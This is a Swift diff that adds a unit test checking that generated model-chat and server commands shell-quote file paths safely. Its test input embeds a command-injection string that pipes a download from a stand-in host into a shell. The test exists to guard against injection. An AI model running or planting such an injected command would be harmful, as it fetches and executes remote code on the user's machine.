@@ -339,3 +339,14 @@ extension SystemPromptTests {
         XCTAssertEqual(model.resolvedUserSystemPrompt(chatIndex: 0), "GLOBAL")
     }
 }
+
+final class InstalledModelDeveloperCommandsTests: XCTestCase {
+    func testCommandsQuoteHostileModelPath() {
+        let hostile = "/Users/me/x$(curl -s evil.example|sh) (LM Studio).gguf"
+        let chat = InstalledModelDeveloperCommandsView.chatCommand(modelPath: hostile)
+        XCTAssertEqual(chat, "turbospark-check --model '\(hostile)' --chat")
+        let serve = InstalledModelDeveloperCommandsView.serveCommand(
+            modelPath: "/m/it's.gguf", defaultSystemPrompt: "")
+        XCTAssertEqual(serve, "turbospark-server --model '/m/it'\\''s.gguf'")
+    }
+}
